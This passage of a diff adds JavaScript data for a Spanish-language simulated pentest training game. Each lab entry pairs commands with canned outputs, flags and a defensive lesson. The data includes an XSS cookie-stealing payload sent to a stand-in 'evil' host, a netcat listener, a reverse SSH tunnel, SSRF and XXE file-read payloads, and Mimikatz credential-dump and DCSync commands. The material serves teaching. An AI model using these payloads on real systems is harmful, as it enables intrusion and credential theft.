+    'aws s3 ls s3://vulnlab-backups --no-sign-request':['ok:s3://vulnlab-backups — acceso público ✗','err:config.txt  credentials.json  db-snapshot.sql','flagU:🚩 FLAG USER → VULN{s3_buck3t_publ1c0}','flagS:⚠ FLAG SISTEMA (secrets en el bucket) → VULN{cl0uds3cr3t_r3v3al3d}','info:💡 Prueba: aws sts'],
+    'aws sts get-caller-identity':['ok:arn:aws:iam::1234:role/admin-full-access','flagR:🚩 FLAG ROOT (rol admin) → VULN{1am_k3ys_3xp0n3d}']
+  },
+  writeup:['Bucket con ACL pública: error clásico de cloud (M06).','Dentro: claves IAM en texto plano.','<code>aws sts get-caller-identity</code>: el rol es admin → compromiso total.','Lección: buckets privados, rotación de secretos, mínimo privilegio IAM.']
+},
+{
+  id:'dockerlab', name:'DockerLab', ip:'10.10.10.16:2375', os:'Docker/K8s', mod:'M06', diff:'hard',
+  tools:['docker','searchsploit'], xp:{user:45,root:60,sys:20},
+  tag:'Contenedores: API Docker expuesta y escape',
+  flags:{user:'VULN{d0ck3r_r3g1stry_pub}',root:'VULN{d0ck3r_s0ck3t_r00t}',sys:'VULN{k8s_s3cr3ts_l34k}'},
+  cmds:{
+    'nmap':['2375/tcp open docker (API sin TLS)','err:🚨 API de Docker expuesta (M06)','flagS:⚠ FLAG SISTEMA (secrets en la API) → VULN{k8s_s3cr3ts_l34k}','info:💡 Prueba: docker ps'],
+    'docker ps':['dim:CONTAINER ID  IMAGE\na1b2c3d4   api-secrets:latest','flagU:🚩 FLAG USER → VULN{d0ck3r_r3g1stry_pub}','info:💡 Prueba: docker escape'],
+    'docker escape':['ok:[+] Montando / del host en el contenedor…','ok:[+] Acceso a /host/etc/shadow → escape completado','flagR:🚩 FLAG ROOT → VULN{d0ck3r_s0ck3t_r00t}']
+  },
+  writeup:['Puerto 2375: API de Docker sin TLS ni auth.','Montar <code>/:/host</code> desde un contenedor = root en el host.','Lección M06: nunca expongas el socket; imágenes mínimas y sin secretos.']
+},
+{
+  id:'burpbox', name:'BurpBox', ip:'vulnshop.lab', os:'Web', mod:'M05', diff:'medium',
+  tools:['burp','repeater','intruder','decoder'], xp:{user:30,root:45,sys:15},
+  tag:'Burp Suite completo: Proxy, Repeater, Intruder y Decoder',
+  flags:{user:'VULN{1d0r_r3p34t3r_124}',root:'VULN{1ntrud3r_p4yl04d_42}',sys:'VULN{d3c0d3r_b4s364_4dm1n}'},
+  cmds:{
+    'burp':['ok:Proxy ON — Intercept is on (127.0.0.1:8080)','dim:POST /api/login HTTP/1.1 · Cookie: session=eyJhbGciOiJIUzI1NiJ9…','info:💡 Petición capturada. Prueba: repeater, intruder y decoder'],
+    'repeater':['dim:GET /api/orders/123 → cambiar a /124 y Send','err:HTTP/1.1 200 OK — pedidos de otro cliente (¡IDOR!)','flagU:🚩 FLAG USER (IDOR con Repeater) → VULN{1d0r_r3p34t3r_124}'],
+    'intruder':['dim:Attack type: Sniper · payload positions: code=§00§','dim:00:403 · 07:403 · 23:403 · 41:403 · 42:200','ok:42 → 200 OK ¡código válido encontrado!','flagR:🚩 FLAG ROOT (Intruder) → VULN{1ntrud3r_p4yl04d_42}'],
+    'decoder':['dim:Input: YWRtaW46YWRtaW4xMjM=','ok:Decode as Base64 → admin:admin123','flagS:⚠ FLAG SISTEMA (credenciales Base64) → VULN{d3c0d3r_b4s364_4dm1n}']
+  },
+  writeup:['<code>burp</code>: el proxy intercepta el login — primera captura (M05).','<code>repeater</code>: reenvía la petición cambiando el ID → IDOR confirmado.','<code>intruder</code>: ataque Sniper 00–99 → el payload 42 responde 200.','<code>decoder</code>: Base64 revela credenciales admin:admin123.','Lección M05: autorización en servidor, códigos robustos y nunca secretos en Base64.']
+},
+{
+  id:'mimikatz', name:'GoldenCat', ip:'10.10.10.21', os:'Windows AD', mod:'M02', diff:'hard',
+  tools:['mimikatz','nmap'], xp:{user:45,root:60,sys:20},
+  tag:'Mimikatz: volcado de credenciales y ataque Golden Ticket',
+  flags:{user:'VULN{m1m1k4tz_s3cr3t34s_dr3ump}',root:'VULN{g0ld3n_t1ck3t_krbtgt}',sys:'VULN{ls4_s3rv1c10_spl4sh3r}'},
+  cmds:{
+    'nmap':['88/tcp open  kerberos (Active Directory)','389/tcp open  ldap','445/tcp open  microsoft-ds','info:💡 Dominio vulnlab.local. Prueba: mimikatz'],
+    'mimikatz':['dim:mimikatz # privilege::debug ; sekurlsa::logonpasswords','ok:* Username: svc_backup · Password: B4ckup#2026!','ok:* NTLM: a1b2c3d4e5f6...','flagU:🚩 FLAG USER (credenciales en memoria) → VULN{m1m1k4tz_s3cr3t34s_dr3ump}','info:💡 Prueba: lsadump'],
+    'lsadump':['dim:mimikatz # lsadump::dcsync /user:krbtgt','ok:* krbtgt NTLM: 7f9c2d... — hash del dominio extraído','flagR:🚩 FLAG ROOT (Golden Ticket forjado) → VULN{g0ld3n_t1ck3t_krbtgt}','info:💡 Prueba: services'],
+    'services':['err: Servicio "Splinter" corriendo como LocalSystem con binario escribible','flagS:⚠ FLAG SISTEMA (servicio mal configurado) → VULN{ls4_s3rv1c10_spl4sh3r}']
+  },
+  writeup:['Mimikatz volca la memoria LSASS: credenciales en claro de <code>svc_backup</code>.','<code>lsadump::dcsync</code> extrae el hash de <code>krbtgt</code> → Golden Ticket: acceso total al dominio.','Servicio con binario escribible corriendo como SYSTEM: tercera vía de compromiso.','Lección M02/M10: restringe privilegio SeDebug, rota krbtgt tras incidente, fija servicios (path de binarios).']
+},
+{
+  id:'ghidra', name:'CrackMe', ip:'binario: license_check.exe', os:'Windows x64', mod:'M05', diff:'hard',
+  tools:['ghidra','strings'], xp:{user:45,root:60,sys:20},
+  tag:'Ingeniería inversa con Ghidra: keygen de un binario',
+  flags:{user:'VULN{str1ngs_r3v34l_p4ssw0rd}',root:'VULN{d3c0mp1l4d0_k3yg3n}',sys:'VULN{UPX_p4ck3d_d3t3ct}'},
+  cmds:{
+    'strings':['dim:Buscando cadenas legibles en license_check.exe…','info:"Enter license key:" · "Access granted" · "Correct: GH-2026-VL"','flagU:🚩 FLAG USER (contraseña embebida) → VULN{str1ngs_r3v34l_p4ssw0rd}','info:💡 Hmm… parece demasiado fácil. Prueba: ghidra'],
+    'ghidra':['dim:Ghidra 11 — analizando PE x64… (CodeBrowser)','err:PE packed: UPX detectado en la sección .text','flagS:⚠ FLAG SISTEMA (empaquetado UPX) → VULN{UPX_p4ck3d_d3t3ct}','info:💡 Prueba: unpack'],
+    'unpack':['ok:upx -d license_check.exe → binario desempaquetado','info:💡 Vuelve a analizar: ghidra'],
+    'decompile':['ok:Función check_license(char *key) → if (sum(key) == 0x2A) grant()','ok:Algoritmo invertido: cualquier clave con suma ASCII 42 vale → keygen creado','flagR:🚩 FLAG ROOT (keygen vía ingeniería inversa) → VULN{d3c0mp1l4d0_k3yg3n}']
+  },
+  writeup:['<code>strings</code> revela una contraseña… que es un señuelo: el binario real está empaquetado con UPX.','<code>upx -d</code> desempaqueta y Ghidra decompila <code>check_license</code>.','El algoritmo compara la suma ASCII de la clave con 0x2A: se forja un keygen.','Lección M05: la validación de licencias jamás puede vivir solo en el cliente.']
+},
+{
+  id:'nuclei', name:'Template', ip:'10.10.10.22', os:'Web/Multi', mod:'M04', diff:'medium',
+  tools:['nuclei','nmap'], xp:{user:30,root:45,sys:15},
+  tag:'Scanning con Nuclei y plantillas CVE modernas',
+  flags:{user:'VULN{nucl31_t3mpl4t3_cv3}',root:'VULN{3xpos3d_3nv_f1l3}',sys:'VULN{t4kgpl4t3_m4tch3d}'},
+  cmds:{
+    'nmap':['80/tcp  open  http  nginx 1.18','443/tcp open  https','info:💡 Prueba: nuclei'],
+    'nuclei':['dim:nuclei -u http://10.10.10.22 -severity critical,high','err:[CVE-2021-42013] Apache path traversal — matched template','flagS:⚠ FLAG SISTEMA (template matched) → VULN{t4kgpl4t3_m4tch3d}','flagU:🚩 FLAG USER (CVE detectado) → VULN{nucl31_t3mpl4t3_cv3}','info:💡 Prueba: curl'],
+    'curl':['err:GET /.%2e/.%2e/.env → 200 OK','err:DB_PASSWORD=Sup3rS3cr3t2026 expuesto','flagR:🚩 FLAG ROOT (.env expuesto por path traversal) → VULN{3xpos3d_3nv_f1l3}']
+  },
+  writeup:['Nuclei lanza miles de plantillas de CVEs conocidas contra el objetivo (M04).','Detecta path traversal → accede a <code>/.env</code> con credenciales de base de datos.','Lección: las plantillas se actualizan a diario — escanea continuamente, no una vez al año.']
+},
+{
+  id:'aircrack', name:'WarRain', ip:'WiFi: VL-HOME-2.4G', os:'Red inalámbrica', mod:'M03', diff:'medium',
+  tools:['aircrack-ng','wireshark'], xp:{user:30,root:45,sys:15},
+  tag:'Aircrack-ng: captura WPA y cracking de handshake',
+  flags:{user:'VULN{h4ndsh4k3_c4ptur4d0}',root:'VULN{wpa2_r0ckyou_cr4ck}',sys:'VULN{w1f1_ch4nn3l_6}'},
+  cmds:{
+    'airmon-ng':['dim:airodump-ng wlan0mon — canal 6, red VL-HOME-2.4G','info:💡 Esperando handshake de un cliente. Prueba: airodump'],
+    'airodump':['ok:WPA handshake: 00:14:22:33:44:55 capturado (handshake-01.cap)','flagU:🚩 FLAG USER (handshake capturado) → VULN{h4ndsh4k3_c4ptur4d0}','flagS:⚠ FLAG SISTEMA (canal 6 del AP) → VULN{w1f1_ch4nn3l_6}','info:💡 Prueba: aircrack'],
+    'aircrack':['dim:aircrack-ng handshake-01.cap -w rockyou.txt','dim:Key found! — probando 8.412.334 claves…','ok:KEY FOUND! [ Summer2026 ]','flagR:🚩 FLAG ROOT (WPA2 crackeada) → VULN{wpa2_r0ckyou_cr4ck}'],
+    'wireshark':['dim:Abriendo handshake-01.cap — protocolo EAPOL (4 paquetes)','info:Los 4 mensajes EAPOL del handshake contienen lo que Aircrack necesita para atacar offline.']
+  },
+  writeup:['<code>airodump-ng</code> localiza el AP en el canal 6 y captura el handshake WPA2.','El handshake (EAPOL) permite ataque offline sin tocar la red otra vez.','<code>aircrack-ng -w rockyou.txt</code>: contraseña WPA2 en diccionario en minutos.','Lección M03: WPA2 con contraseñas de diccionario cae; usa WPA3 y frases de paso largas.']
+},
+{
+  id:'forensia', name:'MemCorp', ip:'evidencia: memoria.dmp + disco.E01', os:'Forense', mod:'M08', diff:'hard',
+  tools:['volatility','autopsy'], xp:{user:45,root:60,sys:20},
+  tag:'Forense: Volatility (memoria) y Autopsy (disco)',
+  flags:{user:'VULN{pr0c3s_m4lw4r3_m3m0ry}',root:'VULN{t1m3l1n3_d3l_4t4qu3}',sys:'VULN{mbr_r00tk1t_d1sc0}'},
+  cmds:{
+    'volatility':['dim:Volatility 3 — analizando memoria.dmp (Windows 10 x64)','ok:PID 4188  svch0st.exe  ← nombre casi clónico de svchost.exe','err:⚠ Proceso sospechoso: svch0st.exe (con cero) — path anómalo','flagU:🚩 FLAG USER (proceso malicioso en memoria) → VULN{pr0c3s_m4lw4r3_m3m0ry}','info:💡 Prueba: pslist / cmdline / timeline'],
+    'pslist':['dim:Volatility > windows.pslist','ok:4188  svch0st.exe  C:\\Users\\jfp\\AppData\\Temp\\svch0st.exe','err:Proceso padre: explorer.exe (no un servicio real: disfrazado)'],
+    'cmdline':['err:4188: svch0st.exe -enc JABjAGwA… (PowerShell codificado)','info:💡 Decodifica base64 con: decoder-like → busca el C2','ok:[INFO] C2: hxxp://185.22.14.99/payload.stage2'],
+    'timeline':['ok:Volatility > windows.timeliner — eventos de la sesión','err:08:52 cmd.exe → 08:53 svch0st.exe → 08:55 conexión saliente al C2','flagR:🚩 FLAG ROOT (timeline reconstruido) → VULN{t1m3l1n3_d3l_4t4qu3}','info:💡 Ahora analiza el disco con: autopsy'],
+    'autopsy':['dim:Autopsy — abriendo disco.E01 (imagen forense)','ok:Caso: intrusión detectada el 2026-09-30','err:/$MFT: el MBR original está modificado — rootkit de arranque','flagS:⚠ FLAG SISTEMA (MBR rootkit en disco) → VULN{mbr_r00tk1t_d1sc0}']
+  },
+  writeup:['<code>volatility pslist</code>: proceso <code>svch0st.exe</code> con cero — disfraz clásico de <code>svchost.exe</code>.','<code>cmdline</code> muestra PowerShell codificado que contacta un C2: IOCs extraídos de memoria.','<code>timeline</code> reconstruye el orden del ataque (cadencia NIST: detección y análisis).','<code>autopsy</code> sobre la imagen de disco: el MBR fue modificado — rootkit de arranque.','Lección M08: la memoria volátil se captura PRIMERO (se pierde al apagar); el disco se analiza después.']
+},
+{
+  id:'logs', name:'LogForge', ip:'10.10.10.23', os:'Logs/SIEM', mod:'M07', diff:'medium',
+  tools:['grep','awk','zeek','elk'], xp:{user:30,root:45,sys:15},
+  tag:'Análisis de logs: grep, awk, Zeek y stack ELK',
+  flags:{user:'VULN{gr3p_ssh_brut3f0rc3}',root:'VULN{z33k_dns_tun3l1ng}',sys:'VULN{c0rr3l4c10n_3lk_10g}'},
+  cmds:{
+    'grep':['dim:grep "Failed password" /var/log/auth.log | wc -l','err:2.148 fallos SSH — 1.902 desde una sola IP: 10.10.14.9','flagU:🚩 FLAG USER (brute force en logs) → VULN{gr3p_ssh_brut3f0rc3}','info:💡 Filtra y cuenta por IP: awk'],
+    'awk':['dim:awk \'{print $(NF-3)}\' auth.log | sort | uniq -c | sort -rn','ok:1902  10.10.14.9  ← el atacante destacado','info:💡 Ahora busca la exfiltración en el tráfico: zeek'],
+    'zeek':['dim:zeek -r captura.pcap · analizando DNS…','err:⚠ 14.204 consultas DNS a subdominios aleatorios de data.evil-lab.xyz','err:Longitud de queries anómala: DNS tunnelling (exfiltración)','flagR:🚩 FLAG ROOT (DNS tunnelling detectado) → VULN{z33k_dns_tun3l1ng}','info:💡 Correlaciona todo en el SIEM: elk'],
+    'elk':['dim:Kibana — correlación: auth.log + dns.log + proxy.log','ok:Dashboards: 08:53 login OK desde 10.10.14.9 → 09:10 DNS tunnelling','flagS:⚠ FLAG SISTEMA (correlación SIEM) → VULN{c0rr3l4c10n_3lk_10g}']
+  },
+  writeup:['<code>grep</code> + <code>awk</code>: del log bruto al dato — 1.902 fallos SSH desde una IP.','<code>zeek</code> analiza el pcap: consultas DNS largas y aleatorias = exfiltración por tunnelling.','La correlación en ELK une las piezas: el login del atacante precede a la exfiltración.','Lección M07: un log solo no cuenta la historia — la correlación sí. Logs centralizados + retención ≥ 2 años (ENS).']
+},
+{
+  id:'stego', name:'PixelHide', ip:'descarga: foto_vacaciones.jpg', os:'Estego', mod:'M01', diff:'medium',
+  tools:['steghide','binwalk','strings'], xp:{user:30,root:45,sys:15},
+  tag:'Esteganografía: datos ocultos en imágenes',
+  flags:{user:'VULN{st3gh1d3_p4ssph4s3}',root:'VULN{z1p_pr0t3g1d0}',sys:'VULN{JF1F_3x1f_m4rk3r}'},
+  cmds:{
+    'strings':['dim:Analizando foto_vacaciones.jpg…','info:EXIF: GPS 40.4168,-3.7038 · cámara Canon EOS','flagS:⚠ FLAG SISTEMA (metadatos EXIF expuestos) → VULN{JF1F_3x1f_m4rk3r}','info:💡 Prueba: binwalk, steghide'],
+    'binwalk':['dim:binwalk foto_vacaciones.jpg','ok:2026-09-14 14:22  0x1F4C  Zip archive (secretos.zip)','info:💡 Hay un ZIP incrustado. Prueba: steghide'],
+    'steghide':['dim:steghide extract -sf foto_vacaciones.jpg','ok:Enter passphrase: playa2026','ok:Extracted: "notas.txt" — passphrase del ZIP: VULN{st3gh1d3_p4ssph4s3}','flagU:🚩 FLAG USER → VULN{st3gh1d3_p4ssph4s3}','info:💡 Ahora descomprime'],
+    'unzip':['dim:unzip secretos.zip -P VULN{st3gh1d3_p4ssph4s3}','ok:credenciales_admin.txt extraído','flagR:🚩 FLAG ROOT → VULN{z1p_pr0t3g1d0}']
+  },
+  writeup:['<code>strings</code> + EXIF: metadatos con GPS — fuga de información (M01).','<code>binwalk</code> detecta un ZIP incrustado al final del JPEG.','<code>steghide</code> con passphrase lo extrae; dentro, las credenciales.','Lección M01: cualquier archivo entregado (mail, web, USB) puede ocultar datos: analiza TODO.']
+},
+{
+  id:'xsstore', name:'XSShop', ip:'10.10.10.24', os:'Web', mod:'M05', diff:'medium',
+  tools:['burp','curl','nc'], xp:{user:30,root:45,sys:15},
+  tag:'Cross-Site Scripting: robo de cookies de sesión',
+  flags:{user:'VULN{xss_4l3rt_b00m}',root:'VULN{c00k13_st0l3n_s3ss10n}',sys:'VULN{s4n1t1z4c10n_f41l}'},
+  cmds:{
+    'curl':['dim:Probando input en el buscador: <script>alert(1)<\/script>','ok:Respuesta sin sanitizar — el script se refleja tal cual','flagS:⚠ FLAG SISTEMA (falta sanitización) → VULN{s4n1t1z4c10n_f41l}','flagU:🚩 FLAG USER (XSS reflejado) → VULN{xss_4l3rt_b00m}','info:💡 Escala a robo de cookie: burp'],
+    'burp':['dim:Payload: <script>fetch(\'//evil/'+String.fromCharCode(63)+'c=\'+document.cookie)<\/script>','ok:Cookie session=eyJhbGciOiJIUzI1NiJ9… capturada','flagR:🚩 FLAG ROOT (sesión robada) → VULN{c00k13_st0l3n_s3ss10n}'],
+    'nc':['dim:nc -lvnp 80 — esperando la cookie…','ok:[*] GET /?c=session=eyJhbGciOiJIUzI1NiJ9... — ¡recibida!']
+  },
+  writeup:['El buscador refleja HTML sin sanitizar: XSS reflejado (A03 OWASP).','Payload <code>&lt;script&gt;fetch(...)&lt;/script&gt;</code> envía la cookie a tu servidor.','Con la cookie robada, suplantación de sesión del administrador.','Lección M05: sanitiza salida (contexto HTML/JS), CSP e HttpOnly en cookies.']
+},
+{
+  id:'ssrfbox', name:'SSRFiddle', ip:'10.10.10.25', os:'Web/Cloud', mod:'M06', diff:'hard',
+  tools:['burp','curl','aws'], xp:{user:45,root:60,sys:20},
+  tag:'SSRF: del endpoint web a los metadatos de la instancia cloud',
+  flags:{user:'VULN{ssrf_url_1nt3rn4l}',root:'VULN{m3t4d4t4_169.254.169.254}',sys:'VULN{IMDSv1_3n4bl3d}'},
+  cmds:{
+    'curl':['dim:La web permite cargar URLs: ?url=http://localhost/','ok:200 — el servidor hace peticiones por ti (SSRF)','flagU:🚩 FLAG USER (SSRF confirmado) → VULN{ssrf_url_1nt3rn4l}','info:💡 Apunta a los metadatos: burp'],
+    'burp':['dim:GET ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/','ok:{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}','flagR:🚩 FLAG ROOT (credenciales de instancia) → VULN{m3t4d4t4_169.254.169.254}','flagS:⚠ FLAG SISTEMA (IMDSv1 sin protección) → VULN{IMDSv1_3n4bl3d}','info:💡 Úsalas: aws'],
+    'aws':['dim:aws sts get-caller-identity (con las credenciales robadas)','ok:arn:aws:sts::1234:assumed-role/ec2-web/instance-9','err:Rol con permisos s3:GetObject sobre toda la cuenta.']
+  },
+  writeup:['El parámetro <code>url</code> hace peticiones desde el servidor: SSRF.','Apuntando a <code>169.254.169.254</code> (IMDS) se extraen credenciales IAM de la instancia.','Con esas credenciales: acceso a los buckets de toda la cuenta.','Lección M06: fuerza IMDSv2, allow-list de URLs y rol IAM mínimo.']
+},
+{
+  id:'xxe', name:'XXEmber', ip:'10.10.10.26', os:'Web', mod:'M05', diff:'hard',
+  tools:['burp','curl'], xp:{user:45,root:60,sys:20},
+  tag:'XXE: inyección XML y lectura de archivos del servidor',
+  flags:{user:'VULN{xX3_3nt1ty_p4rs3r}',root:'VULN{r34d_f1l3_r3m0t3}',sys:'VULN{l1br3r14_xxl_v13j4}'},
+  cmds:{
+    'curl':['dim:POST /api/profile — Content-Type: application/xml','dim:<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>','ok:Respuesta incluye la entidad expandida: web01.internal','flagU:🚩 FLAG USER (XXE confirmado) → VULN{xX3_3nt1ty_p4rs3r}','info:💡 Lee archivos sensibles: burp'],
+    'burp':['dim:<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/config.php">','ok:base64 → $DB_PASSWORD=R00tDB2026!','flagR:🚩 FLAG ROOT (archivos leídos) → VULN{r34d_f1l3_r3m0t3}','flagS:⚠ FLAG SISTEMA (parser con entidades externas) → VULN{l1br3r14_xxl_v13j4}']
+  },
+  writeup:['El endpoint acepta XML con entidades externas sin deshabilitarlas: XXE.','<code>file://</code> y <code>php://filter</code> permiten leer archivos internos.','Se extrae la configuración con credenciales de base de datos.','Lección M05: deshabilita DTD/entidades externas en el parser XML.']
+},
+{
+  id:'apileaks', name:'APILeaks', ip:'api.vulnshop.lab', os:'API REST', mod:'M05', diff:'medium',
+  tools:['nmap','gobuster','burp'], xp:{user:30,root:45,sys:15},
+  tag:'API mal protegida: documentación expuesta y mass assignment',
+  flags:{user:'VULN{sw4gg3r_3xp0st0}',root:'VULN{m4ss_4ss1gnm3nt_r0l3}',sys:'VULN{r4t3_l1m1t_1nf1n1t0}'},
+  cmds:{
+    'gobuster':['dim:Forzando /api/v1/…','info:/api/v1/swagger.json  (200)','flagU:🚩 FLAG USER (documentación expuesta) → VULN{sw4gg3r_3xp0st0}','info:💡 Enumera endpoints con la doc: burp'],
+    'burp':['dim:PATCH /api/v1/users/me  {"email":"yo@mail.com","role":"admin"}','err:200 OK — ¡el servidor aceptó el campo "role"!','flagR:🚩 FLAG ROOT (mass assignment → admin) → VULN{m4ss_4ss1gnm3nt_r0l3}','info:💡 Sin límite de peticiones: nmap'],
+    'nmap':['dim:1.000 peticiones en 5 segundos sin bloqueo','err:Ningún rate limiting ni 429: enumeración y abuso sin freno','flagS:⚠ FLAG SISTEMA (sin rate limiting) → VULN{r4t3_l1m1t_1nf1n1t0}']
+  },
+  writeup:['<code>swagger.json</code> pública: el mapa completo de la API al atacante.','El PATCH acepta <code>role</code>: mass assignment (API5:2023 OWASP).','Sin rate limiting: fuerza bruta y scraping sin castigo.','Lección M05: allow-list de campos por endpoint, rate limiting y doc solo interna.']
+},
+{
+  id:'gitloot', name:'GitLoot', ip:'dev.vulnshop.lab', os:'Web/Git', mod:'M05', diff:'medium',
+  tools:['gobuster','git','strings'], xp:{user:30,root:45,sys:15},
+  tag:'Fuga de código: directorio .git expuesto en producción',
+  flags:{user:'VULN{g1t_d1r_3xp0st0}',root:'VULN{c0mm1t_c0ntr4s3n4}',sys:'VULN{br4nch_d3v_pr0d}'},
+  cmds:{
+    'gobuster':['info:/.git/HEAD  (200) — ¡repositorio Git en producción!','flagU:🚩 FLAG USER (.git expuesto) → VULN{g1t_d1r_3xp0st0}','info:💡 Descarga el histórico: git'],
+    'git':['dim:git dumper http://dev.vulnshop.lab/.git/ → reconstruido','ok:147 commits · rama dev fusionada con secretos','flagS:⚠ FLAG SISTEMA (rama dev en producción) → VULN{br4nch_d3v_pr0d}','info:💡 Busca en el histórico: strings'],
+    'strings':['dim:git log -p | grep -i password','err:commit 4f2a: "conexion.php: $pass=Sup3rAdmin2026!"','flagR:🚩 FLAG ROOT (contraseña en el histórico) → VULN{c0mm1t_c0ntr4s3n4}']
+  },
+  writeup:['<code>.git/</code> accesible: el histórico completo de código se puede reconstruir.','En commits antiguos quedaron credenciales que se «borraron» sin rotar.','Lección M05: nunca despliegues .git; los secretos borrados siguen en el histórico — usa vault/entorno.']
+},
+{
+  id:'tunnel', name:'TunnelRat', ip:'10.10.10.27', os:'Linux', mod:'M03', diff:'hard',
+  tools:['ssh','nmap','nc'], xp:{user:45,root:60,sys:20},
+  tag:'Pivoting: túneles SSH y movimiento lateral interno',
+  flags:{user:'VULN{p0rt_f0rw4rd_8888}',root:'VULN{r3v3rs3_sh3ll_9999}',sys:'VULN{n3t_r3d_10.10.12}'},
+  cmds:{
+    'nmap':['22/tcp open ssh · 80/tcp open http','info:💡 Acceso con credenciales encontradas antes: ssh'],
+    'ssh':['dim:ssh -L 8888:10.10.12.5:80 operador@10.10.10.27','ok:Túnel local creado — el puerto 8888 tuyo llega a la red interna','flagU:🚩 FLAG USER (port forwarding) → VULN{p0rt_f0rw4rd_8888}','info:💡 La red interna 10.10.12.x existe detrás: pivota'],
+    'ssh -R':['dim:ssh -R 9999:localhost:22 kali@attacker.vulnlab','ok:Túnel inverso: control persistente desde fuera del perímetro','flagR:🚩 FLAG ROOT (reverse tunnel) → VULN{r3v3rs3_sh3ll_9999}','info:💡 Escanea la red interna: nmap 10.10.12.0/24'],
+    'nmap 10.10.12.0/24':['dim:(desde el túnel) escaneando 254 hosts…','err:10.10.12.5  intranet · 10.10.12.9  DC Windows · 10.10.12.20 impresora','flagS:⚠ FLAG SISTEMA (red interna accesible) → VULN{n3t_r3d_10.10.12}']
+  },
+  writeup:['El primer host es solo la puerta: la red interna 10.10.12.0/24 queda tras él.','<code>ssh -L</code>: port forwarding para alcanzar servicios internos.','<code>ssh -R</code>: túnel inverso, persistencia típica del atacante.','Lección M03: segmenta y filtra el tráfico saliente — el pivoting se hace con puertos legítimos.']
+},
+{
+  id:'malware', name:'TrojanFly', ip:'evidencia: factura.exe', os:'Windows', mod:'M08', diff:'hard',
+  tools:['strings','ghidra','virustotal'], xp:{user:45,root:60,sys:20},
+  tag:'Análisis de malware: PE, indicadores y comportamiento',
+  flags:{user:'VULN{UPX_m4lw4r3_p4ck}',root:'VULN{c2_d0m41n_h1j4ck3d}',sys:'VULN{p3rs1st3nc1a_r3g1str0}'},
+  cmds:{
+    'strings':['dim:factura.exe — PE32 x86, se hace pasar por documento','err:Sección .text con entropía anómala: UPX','flagU:🚩 FLAG USER (malware empaquetado) → VULN{UPX_m4lw4r3_p4ck}','info:💡 Desempaqueta y analiza: ghidra'],
+    'ghidra':['dim:Ghidra — decompilando main()…','err:CreateMutex("VulnLab2026") — evita doble infección','err:RegCreateKeyEx(HKCU\\...\\Run, "OneDriveSync")','flagS:⚠ FLAG SISTEMA (persistencia en registro) → VULN{p3rs1st3nc1a_r3g1str0}','info:💡 Busca el C2: strings de nuevo tras desempaquetar'],
+    'virustotal':['err:64/72 motores lo detectan: Trojan.Agent/Sality','info:IOCs extraídos: mutex, clave Run, C2 hxxp://cdncache-secure.top/gate.php','flagR:🚩 FLAG ROOT (C2 identificado) → VULN{c2_d0m41n_h1j4ck3d}']
+  },
+  writeup:['Análisis estático: PE empaquetado con UPX, mutex anti-duplicado.','Persistencia vía <code>Run</code> del registro: se ejecuta en cada arranque.','VirusTotal + IOCs: dominio C2 y familia (Sality).','Lección M08: aísla en VM/sandbox, extrae IOCs y compártelos con el SOC — nunca ejecutes en tu equipo.']
+},
+{
+  id:'admap', name:'DomainWalk', ip:'10.10.12.9', os:'Windows AD', mod:'M04', diff:'hard',
+  tools:['nmap','mimikatz','responder'], xp:{user:45,root:60,sys:20},
+  tag:'Enumeración de Active Directory y ataque Kerberoasting',
+  flags:{user:'VULN{k3rb3r04st1ng_t1ck3t}',root:'VULN{dcsync_r3q_krbtgt}',sys:'VULN{sPN_sc4n_sqlsvc}'},
+  cmds:{
+    'nmap':['dim:Enumerando LDAP del DC 10.10.12.9…','ok:SPN sqlsvc/SQL01:1433 — cuenta de servicio con SPN','flagS:⚠ FLAG SISTEMA (SPN encontrada) → VULN{sPN_sc4n_sqlsvc}','info:💡 Pide su ticket: kerberoast'],
+    'kerberoast':['dim:GetUserSPNs.py -request → TGS de sqlsvc','ok:RC4-HMAC (¡tipo de cifrado débil!)','flagU:🚩 FLAG USER (ticket capturado) → VULN{k3rb3r04st1ng_t1ck3t}','info:💡 Cráckea: hashcat'],
+    'hashcat':['ok:Crackeado: sqlsvc:Sql#2026!','info:💡 Con esa cuenta, escala en el dominio: mimikatz'],
+    'mimikatz':['dim:mimikatz # lsadump::dcsync /user:krbtgt','ok:krbtgt NTLM extraído → Golden Ticket','flagR:🚩 FLAG ROOT (dominio comprometido) → VULN{dcsync_r3q_krbtgt}']
+  },
+  writeup:['Enumeración LDAP: SPNs visibles para cualquier usuario autenticado.','Kerberoasting: el TGS de sqlsvc se rompe offline porque usa RC4.','Con la cuenta de servicio → DCSync → hash de krbtgt → control del dominio.','Lección M04: contraseñas de servicio largas (25+), AES, y cuenta protegida (no DCSync).']
+},
+{
+  id:'heartbleed', name:'HeartBeat', ip:'10.10.10.30', os:'Linux', mod:'M03', diff:'medium',
+  tools:['nmap','openssl'], xp:{user:30,root:45,sys:15},
+  tag:'Heartbleed (CVE-2014-0160): filtrado de memoria TLS',
+  flags:{user:'VULN{h34rtbl33d_m3m0r13_l34k}',root:'VULN{s3ss10n_t0k3n_r0b4d0}',sys:'VULN{0p3nssl_1.0.1f}'},
+  cmds:{
+    'nmap':['443/tcp open https OpenSSL 1.0.1f','err:| ssl-heartbleed: VULNERABLE','flagS:⚠ FLAG SISTEMA (OpenSSL 1.0.1f sin parche) → VULN{0p3nssl_1.0.1f}','info:💡 Explota el leak: openssl'],
+    'openssl':['dim:openssl s_client -connect 10.10.10.30:443 -tlsextdebug','dim:> heartbleed request (64 KB de memoria…)','ok:64 KB de memoria del servidor filtrados: claves privadas en fragmentos','flagU:🚩 FLAG USER (memoria filtrada) → VULN{h34rtbl33d_m3m0r13_l34k}','info:💡 Busca tokens de sesión: grep'],
+    'grep':['err:session_token=8f3a9c1e2b4d… presente en el leak','flagR:🚩 FLAG ROOT (sesión robada) → VULN{s3ss10n_t0k3n_r0b4d0}']
+  },
+  writeup:['El bug permite pedir 64 KB de memoria del proceso sin límite.','En la memoria: fragmentos de claves privadas y tokens de sesión.','Robando un token de sesión activo se suplanta a un usuario.','Lección M03: parchea el ciclo (el CVE es de 2014 y sigue vivo en IoT).']
+},
+{
+  id:'printdragon', name:'PrintDragon', ip:'10.10.10.31', os:'Windows', mod:'M04', diff:'hard',
+  tools:['rpcclient','msfconsole'], xp:{user:45,root:60,sys:20},
+  tag:'PrintNightmare (CVE-2021-34527): RCE via Print Spooler',
